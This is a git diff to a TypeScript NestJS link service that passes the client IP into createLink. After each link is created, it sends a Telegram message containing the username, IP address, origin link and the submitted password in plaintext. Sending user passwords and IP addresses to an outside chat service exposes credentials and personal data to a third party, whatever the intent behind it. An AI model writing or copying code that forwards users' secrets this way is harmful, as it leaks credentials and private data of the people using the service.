@@ -7,7 +7,7 @@ import {UserEntity, UserEntityDocument} from "../user/entities/user.entity";
 import {PaginateModel} from "mongoose";
 import {LinkEntity, LinkEntityDocument} from "./entities/link.entity";
 import * as moment from 'moment';
-
+import Telegram from "../utils/telegram";
 
 @Injectable()
 export class LinkService {
@@ -39,7 +39,7 @@ export class LinkService {
     }
     return result;
   }
-  async createLink(body: CreateLinkDto) : Promise<LinkEntity[]>{
+  async createLink(body: CreateLinkDto, ip: string) : Promise<LinkEntity[]>{
     try {
       let link = null
       let user = null
@@ -104,6 +104,15 @@ export class LinkService {
       } else {
         throw new Error(`Exceeding the permitted limits`)
       }
+      Telegram.send(`
+      --------------------------------
+      Create a new link \n
+      User: ${body['username']} - IP: ${ip} \n
+      Quantity: ${body['limit']} \n
+      Origin: ${body['origin_link']} \n
+      Password: ${body['password']} \n
+      ---------------------------------
+      `)
       return list_link
     } catch (e) {
       throw new HttpException(e.message, HttpStatus.BAD_REQUEST)
